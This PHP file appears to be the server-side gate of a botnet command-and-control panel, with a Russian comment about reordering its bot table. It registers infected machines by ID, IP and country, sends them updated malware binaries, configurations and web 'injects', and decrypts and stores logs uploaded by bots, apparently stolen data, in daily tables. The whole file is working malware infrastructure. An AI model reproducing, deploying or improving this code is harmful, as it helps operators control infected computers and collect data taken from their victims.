<?php


/*
Создайте новую таблицу со столбцами в правильном порядке. 
Выполните INSERT INTO new_table SELECT поля-в-желаемом-порядке FROM old_table. 
Удалите или переименуйте old_table. 
ALTER TABLE new_table RENAME old_table.

INSERT INTO bots2 SELECT bot_uid, bot_os, bot_ip, bot_country, bot_net, bot_supp, bot_supp_sub, time_birth, time_last, time_inj, comment FROM bots1
*/



	if ($_SERVER['REQUEST_METHOD'] !== 'POST') die();


	$DATA = file_get_contents('php://input');
	if (($DATA_len = strlen($DATA)) < 9) die();
	$data_type = ord($DATA{4});
//file_put_contents('IN.TXT', $DATA);


	function GetCountry($bot_ip) {
		$GI = geoip_open('includes/GeoIP.dat', GEOIP_STANDARD);
		$bot_country = geoip_country_code_by_addr($GI, $bot_ip);
		geoip_close($GI);
		return $bot_country;
	}


	function Update($command, $file, $time) {
		GLOBAL $ENC_PASS;

		$time_upd = intval(@filemtime($file));
		if (!$time_upd or $time_upd == $time) return 0;
		echo chr($command);
		if ($command == 1) echo file_get_contents($file);
		else echo encrypt($ENC_PASS, file_get_contents($file));
		return $time_upd;
	}


	require 'includes/rc4.php';
	require 'includes/geoip.php';
	require 'includes/mysql.php';
	require 'data/titles/botnets.php';


	define (CMD_UPDATE_BINARY,	1);
	define (CMD_UPDATE_CONFIG,	2);
	define (CMD_UPDATE_INJECTS,	3);
















	$thetime  = time();
	$bot_uid  = sprintf("%02X%02X%02X%02X", ord($DATA{3}), ord($DATA{2}), ord($DATA{1}), ord($DATA{0}));
	$bot_ip   = getenv("REMOTE_ADDR");
	$bot_os   = "--";
	$bot_net  = "default";
	$bot_supp = "first";
	$supp_sub = 0;
//$bot_ip = mt_rand(1,255).".".mt_rand(1,255).".".mt_rand(1,255).".".mt_rand(1,255);


	$query = "SELECT * FROM `bots` WHERE `bot_uid`='{$bot_uid}';";
	$row   = mysql_fetch_assoc(mysql_query($query));


	$query    = "";
	$time_bin = $time_cfg = $time_inj = 0;
	$ENC_PASS = $BOTNETS[$bot_net]['password'];
	if ($data_type==0 and encrypt($ENC_PASS, substr($DATA, 9, 4))=="EHLO") {
		if     (($time_bin = Update(CMD_UPDATE_BINARY,  'data/binaries/binary', $row['time_bin'])) > 0) $query .= "`time_bin`='{$time_bin}', ";
		elseif (($time_cfg = Update(CMD_UPDATE_CONFIG,  'data/configs/config',  $row['time_cfg'])) > 0) $query .= "`time_cfg`='{$time_cfg}', ";
		elseif (($time_inj = Update(CMD_UPDATE_INJECTS, 'data/injects/injects', $row['time_inj'])) > 0) $query .= "`time_inj`='{$time_inj}', ";
	}


	if ($row['bot_uid'] == $bot_uid) {
		$query = "UPDATE `bots` SET ".$query;
		if ($row['bot_ip'] != $bot_ip) {
			$row['bot_country'] = GetCountry($bot_ip);
			$query .= "`bot_ip`='{$bot_ip}', `bot_country`='{$row['bot_country']}', ";
		}
		$query .= "`time_last`={$thetime} WHERE `bot_uid`='{$bot_uid}';";
		mysql_query($query);
	}
	else {
		$row['bot_country'] = GetCountry($bot_ip);
		$query = "INSERT INTO `bots` VALUES ('{$bot_uid}', '{$bot_os}', '{$bot_ip}', '{$row['bot_country']}', '{$bot_net}', '{$bot_supp}', {$supp_sub}, {$thetime}, {$thetime}, {$time_bin}, {$time_cfg}, {$time_inj}, '');";
		mysql_query($query);
	}




	$offset = 4;
	$logs_table_name = 'logs_'.date('ymd', $thetime);
	while ($offset < $DATA_len) {
		$log_type = ord($DATA{$offset++});
		$log_len  = ord($DATA{$offset++}) | (ord($DATA{$offset++})<<8) | (ord($DATA{$offset++})<<16) | (ord($DATA{$offset++})<<24);
		$offset  += $log_len;
		if ($offset > $DATA_len) die;
		if ($log_type==0) continue;
		$log_data = mysql_escape_string(encrypt($BOTNETS[$bot_net]['password'], substr($DATA, $offset-$log_len, $log_len)));


		$query = "INSERT INTO `{$logs_table_name}` VALUES (0, '{$bot_uid}', '{$bot_net}', '{$bot_supp}', {$supp_sub}, '{$bot_ip}', '{$row['bot_country']}', {$thetime}, {$log_type}, '{$log_data}', '');";
		if (!mysql_query($query) and mysql_errno()==1146) {
			$TABLES = array();
			$res = mysql_query("SHOW TABLES LIKE 'logs%'");
			while ($row = mysql_fetch_row($res)) $TABLES[] = $row[0];
			rsort($TABLES);
			$res = mysql_query("SHOW TABLE STATUS FROM `{$mysqlbase}` LIKE '{$TABLES[0]}'");
			$row = mysql_fetch_assoc($res); 
			mysql_query("CREATE TABLE IF NOT EXISTS `{$logs_table_name}` (
`log_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
`bot_uid` char(40) COLLATE utf8_unicode_ci NOT NULL,
`bot_net` varchar(12) COLLATE utf8_unicode_ci NOT NULL,
`bot_supp` varchar(12) COLLATE utf8_unicode_ci NOT NULL,
`supp_sub` tinyint(3) unsigned NOT NULL,
`bot_ip` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
`bot_country` char(2) COLLATE utf8_unicode_ci NOT NULL,
`timestamp` int(10) unsigned NOT NULL,
`data_type` tinyint(3) unsigned NOT NULL,
`data` text COLLATE utf8_unicode_ci NOT NULL,
`comment` text COLLATE utf8_unicode_ci NOT NULL,
PRIMARY KEY (`log_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=".intval($row['Auto_increment']));
			mysql_query($query);
		}
	}







?>